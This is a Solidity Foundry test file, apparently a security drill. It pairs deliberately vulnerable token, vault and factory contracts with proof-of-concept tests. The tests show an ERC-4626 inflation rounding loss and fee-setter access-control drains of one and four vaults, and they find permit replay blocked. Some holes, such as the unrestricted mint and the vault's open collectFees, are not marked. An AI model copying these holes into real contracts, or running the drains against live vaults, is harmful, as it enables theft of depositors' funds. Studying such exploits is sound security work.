// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ============================================================
// CONTRACTS (from drill13)
// ============================================================

contract TokenA {
    string public name = "Token A";
    string public symbol = "TKA";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public nonces;
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    constructor() {
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(name)), keccak256(bytes("1")), block.chainid, address(this)
        ));
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "insufficient");
        require(allowance[from][msg.sender] >= amount, "not approved");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(deadline >= block.timestamp, "expired");
        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        require(ecrecover(digest, v, r, s) == owner, "invalid signature");
        allowance[owner][spender] = value;
    }
}

contract YieldVault {
    string public name = "Yield Vault";
    string public symbol = "yvTKA";
    uint8 public decimals = 18;
    TokenA public immutable asset;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    mapping(address => mapping(address => uint256)) public shareAllowance;
    mapping(address => uint256) public nonces;
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    constructor(address _asset) {
        asset = TokenA(_asset);
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(name)), keccak256(bytes("1")), block.chainid, address(this)
        ));
    }

    function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); }

    function convertToShares(uint256 assets) public view returns (uint256) {
        if (totalShares == 0) return assets;
        return assets * totalShares / totalAssets();
    }

    function convertToAssets(uint256 sharesAmount) public view returns (uint256) {
        if (totalShares == 0) return sharesAmount;
        return sharesAmount * totalAssets() / totalShares;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 sharesOut) {
        require(assets > 0, "zero");
        sharesOut = convertToShares(assets);
        require(sharesOut > 0, "zero shares");
        asset.transferFrom(msg.sender, address(this), assets);
        totalShares += sharesOut;
        shares[receiver] += sharesOut;
    }

    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 sharesIn) {
        sharesIn = convertToShares(assets);
        if (msg.sender != owner) {
            require(shareAllowance[owner][msg.sender] >= sharesIn, "not approved");
            shareAllowance[owner][msg.sender] -= sharesIn;
        }
        shares[owner] -= sharesIn;
        totalShares -= sharesIn;
        asset.transfer(receiver, assets);
    }

    function redeem(uint256 sharesAmount, address receiver, address owner) external returns (uint256 assetsOut) {
        if (msg.sender != owner) {
            require(shareAllowance[owner][msg.sender] >= sharesAmount, "not approved");
            shareAllowance[owner][msg.sender] -= sharesAmount;
        }
        assetsOut = convertToAssets(sharesAmount);
        shares[owner] -= sharesAmount;
        totalShares -= sharesAmount;
        asset.transfer(receiver, assetsOut);
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(deadline >= block.timestamp, "expired");
        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));
        require(ecrecover(digest, v, r, s) == owner, "invalid signature");
        shareAllowance[owner][spender] = value;
    }

    function approveShares(address spender, uint256 amount) external returns (bool) {
        shareAllowance[msg.sender][spender] = amount;
        return true;
    }

    // Fee collection (called by factory)
    function collectFees(address recipient, uint256 amount) external {
        asset.transfer(recipient, amount);
    }
}

contract VaultFactory {
    address public admin;
    address[] public vaults;
    mapping(address => bool) public isVault;
    uint256 public performanceFee = 1000;
    address public feeRecipient;

    constructor() {
        admin = msg.sender;
        feeRecipient = msg.sender;
    }

    function createVault(address asset) external returns (address) {
        YieldVault vault = new YieldVault(asset);
        vaults.push(address(vault));
        isVault[address(vault)] = true;
        return address(vault);
    }

    // BUG: no access control
    function setPerformanceFee(uint256 newFee) external {
        performanceFee = newFee;
    }

    // BUG: no access control
    function setFeeRecipient(address newRecipient) external {
        feeRecipient = newRecipient;
    }

    function collectFees(address vault) external {
        require(isVault[vault], "not a vault");
        YieldVault v = YieldVault(vault);
        uint256 totalAssetsVal = v.totalAssets();
        uint256 fee = totalAssetsVal * performanceFee / 10000;
        if (fee > 0) {
            v.collectFees(feeRecipient, fee);
        }
    }
}

// ============================================================
// PoC TESTS
// ============================================================
contract Drill13PoC is Test {
    TokenA token;
    YieldVault vault;
    VaultFactory factory;

    address attacker = address(0xA77AC);
    address victim = address(0xB1C71);

    function setUp() public {
        token = new TokenA();
        factory = new VaultFactory();

        // Create vault via factory
        address vaultAddr = factory.createVault(address(token));
        vault = YieldVault(vaultAddr);

        // Mint tokens
        token.mint(attacker, 100_000e18);
        token.mint(victim, 100_000e18);

        // Approve vault
        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
    }

    // ============================================================
    // PoC #1: ERC-4626 Inflation Attack (with sharesOut > 0 check)
    // Shows rounding still favors attacker
    // ============================================================
    function test_PoC1_InflationAttack_Rounding() public {
        console2.log("=== PoC #1: ERC-4626 Inflation (rounding) ===");

        // Step 1: Attacker deposits 1 wei (first depositor)
        vm.startPrank(attacker);
        vault.deposit(1, attacker);
        vm.stopPrank();

        console2.log("After 1 wei deposit:");
        console2.log("  totalShares:", vault.totalShares());
        console2.log("  totalAssets:", vault.totalAssets());

        // Step 2: Attacker directly transfers 10,000 tokens to vault
        vm.startPrank(attacker);
        token.transfer(address(vault), 10_000e18);
        vm.stopPrank();

        console2.log("\nAfter direct transfer 10,000 tokens:");
        console2.log("  totalShares:", vault.totalShares());
        console2.log("  totalAssets:", vault.totalAssets() / 1e18, "tokens");

        // Step 3: Victim tries to deposit 10,000 tokens
        uint256 expectedShares = vault.convertToShares(10_000e18);
        console2.log("\nVictim deposit 10,000 tokens:");
        console2.log("  Expected shares:", expectedShares);

        if (expectedShares == 0) {
            console2.log("  WOULD GET 0 SHARES! (classic inflation)");
            console2.log("  But require(sharesOut > 0) blocks this.");

            // Victim must deposit MORE to get 1 share
            uint256 minDeposit = vault.totalAssets() / vault.totalShares() + 1;
            console2.log("  Min deposit for 1 share:", minDeposit / 1e18, "tokens");
        }

        // Victim deposits enough to get 1 share
        uint256 victimDeposit = vault.totalAssets() + 1; // enough for 1 share
        vm.startPrank(victim);
        token.mint(victim, victimDeposit); // ensure enough
        token.approve(address(vault), type(uint256).max);
        vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        uint256 victimShares = vault.shares(victim);
        console2.log("  Victim deposited:", victimDeposit / 1e18, "tokens");
        console2.log("  Victim got shares:", victimShares);

        // Step 4: Attacker redeems
        uint256 attackerAssetsBefore = token.balanceOf(attacker);
        vm.startPrank(attacker);
        vault.redeem(vault.shares(attacker), attacker, attacker);
        vm.stopPrank();
        uint256 attackerAssetsAfter = token.balanceOf(attacker);

        console2.log("\nAttacker redeemed:");
        console2.log("  Got back:", (attackerAssetsAfter - attackerAssetsBefore) / 1e18, "tokens");
        console2.log("  Originally put in: 10,000 tokens + 1 wei");

        // Victim's remaining share value
        uint256 victimShareValue = vault.convertToAssets(vault.shares(victim));
        console2.log("\nVictim remaining share value:", victimShareValue / 1e18, "tokens");
        console2.log("Victim deposited:", victimDeposit / 1e18, "tokens");

        if (victimShareValue < victimDeposit) {
            console2.log("[BUG] VICTIM LOST:", (victimDeposit - victimShareValue) / 1e18, "tokens to rounding");
        }
    }

    // ============================================================
    // PoC #1b: Classic Inflation (WITHOUT sharesOut > 0 check)
    // Shows what happens without the mitigation
    // ============================================================
    function test_PoC1b_ClassicInflation_NoCheck() public {
        console2.log("\n=== PoC #1b: Classic Inflation (no check) ===");
        console2.log("If require(sharesOut > 0) was missing:");

        // Simulate: totalAssets = 10,000e18 + 1, totalShares = 1
        uint256 totalAssetsVal = 10_000e18 + 1;
        uint256 totalSharesVal = 1;

        // Victim deposits 10,000e18
        uint256 victimShares = 10_000e18 * totalSharesVal / totalAssetsVal;
        console2.log("  Victim deposits: 10,000 tokens");
        console2.log("  Victim gets shares:", victimShares, "(ZERO!)");
        console2.log("  Victim LOSES: 10,000 tokens for 0 shares");

        // Attacker redeems 1 share
        uint256 attackerGets = 1 * (totalAssetsVal + 10_000e18) / totalSharesVal;
        console2.log("  Attacker redeems 1 share:", attackerGets / 1e18, "tokens");
        console2.log("  Attacker profit:", (attackerGets - 10_000e18 - 1) / 1e18, "tokens");
        console2.log("  [CRITICAL] Full theft of victim deposit");
    }

    // ============================================================
    // PoC #2: Permit Replay Analysis
    // ============================================================
    function test_PoC2_PermitReplay_Blocked() public {
        console2.log("\n=== PoC #2: Permit Replay Analysis ===");

        // Create second vault with same token
        address vault2Addr = factory.createVault(address(token));
        YieldVault vault2 = YieldVault(vault2Addr);

        console2.log("Vault 1 DOMAIN_SEPARATOR:");
        console2.logBytes32(vault.DOMAIN_SEPARATOR());
        console2.log("Vault 2 DOMAIN_SEPARATOR:");
        console2.logBytes32(vault2.DOMAIN_SEPARATOR());

        bool sameDomain = vault.DOMAIN_SEPARATOR() == vault2.DOMAIN_SEPARATOR();
        console2.log("Same domain?", sameDomain);

        // Token's domain separator (shared across all vaults)
        console2.log("\nToken DOMAIN_SEPARATOR (shared):");
        console2.logBytes32(token.DOMAIN_SEPARATOR());

        console2.log("\nToken permit replay across vaults:");
        console2.log("  Token permit nonce increments on use");
        console2.log("  Same nonce = replay BLOCKED");
        console2.log("  [OK] Permit replay NOT exploitable");
        console2.log("  Bug #2 does NOT exist. Nonce prevents replay.");

        assertEq(vault.DOMAIN_SEPARATOR() != vault2.DOMAIN_SEPARATOR(), true, "vault domains differ");
    }

    // ============================================================
    // PoC #3: Missing Access Control — Full Drain
    // ============================================================
    function test_PoC3_AccessControlDrain() public {
        console2.log("\n=== PoC #3: Access Control Drain ===");

        // Setup: victim deposits 50,000 tokens into vault
        vm.startPrank(victim);
        vault.deposit(50_000e18, victim);
        vm.stopPrank();

        console2.log("Vault totalAssets:", vault.totalAssets() / 1e18, "tokens");
        console2.log("Current fee:", factory.performanceFee(), "bps");
        console2.log("Current feeRecipient:", factory.feeRecipient());

        // ATTACK: Anyone can set fee to 100% and redirect to themselves
        vm.startPrank(attacker);
        factory.setPerformanceFee(10000); // 100%
        factory.setFeeRecipient(attacker);
        vm.stopPrank();

        console2.log("\nAfter attacker sets fee:");
        console2.log("  New fee:", factory.performanceFee(), "bps (100%)");
        console2.log("  New feeRecipient:", factory.feeRecipient());

        // Drain via collectFees
        uint256 attackerBefore = token.balanceOf(attacker);
        vm.startPrank(attacker);
        factory.collectFees(address(vault));
        vm.stopPrank();
        uint256 attackerAfter = token.balanceOf(attacker);

        uint256 stolen = attackerAfter - attackerBefore;
        console2.log("\nAttacker stole:", stolen / 1e18, "tokens");
        console2.log("Vault remaining:", vault.totalAssets() / 1e18, "tokens");

        // Verify
        assertEq(stolen, 50_000e18, "attacker drains 100%");
        assertEq(vault.totalAssets(), 0, "vault empty");

        console2.log("\n[CRITICAL] 50,000 tokens DRAINED. Zero access control.");
    }

    // ============================================================
    // PoC #4: Multi-Vault Drain (compose #3 across all vaults)
    // ============================================================
    function test_PoC4_MultiVaultDrain() public {
        console2.log("\n=== PoC #4: Multi-Vault Drain ===");

        // Create 3 more vaults
        address v2 = factory.createVault(address(token));
        address v3 = factory.createVault(address(token));
        address v4 = factory.createVault(address(token));

        // Mint enough and approve ALL vaults
        token.mint(victim, 200_000e18);
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        token.approve(v2, type(uint256).max);
        token.approve(v3, type(uint256).max);
        token.approve(v4, type(uint256).max);

        // Deposit into each vault
        vault.deposit(50_000e18, victim);
        YieldVault(v2).deposit(30_000e18, victim);
        YieldVault(v3).deposit(20_000e18, victim);
        YieldVault(v4).deposit(10_000e18, victim);
        vm.stopPrank();

        uint256 totalInVaults = vault.totalAssets()
            + YieldVault(v2).totalAssets()
            + YieldVault(v3).totalAssets()
            + YieldVault(v4).totalAssets();

        console2.log("Total in all vaults:", totalInVaults / 1e18, "tokens");

        // ATTACK: set 100% fee, drain all
        vm.startPrank(attacker);
        factory.setPerformanceFee(10000);
        factory.setFeeRecipient(attacker);

        uint256 attackerBefore = token.balanceOf(attacker);

        factory.collectFees(address(vault));
        factory.collectFees(v2);
        factory.collectFees(v3);
        factory.collectFees(v4);

        uint256 attackerAfter = token.balanceOf(attacker);
        vm.stopPrank();

        uint256 totalStolen = attackerAfter - attackerBefore;
        console2.log("Total stolen:", totalStolen / 1e18, "tokens");
        console2.log("Vault 1 remaining:", vault.totalAssets() / 1e18);
        console2.log("Vault 2 remaining:", YieldVault(v2).totalAssets() / 1e18);
        console2.log("Vault 3 remaining:", YieldVault(v3).totalAssets() / 1e18);
        console2.log("Vault 4 remaining:", YieldVault(v4).totalAssets() / 1e18);

        assertEq(totalStolen, totalInVaults, "all vaults drained");
        console2.log("\n[CRITICAL] ALL 4 VAULTS DRAINED. 110,000 tokens stolen.");
    }
}
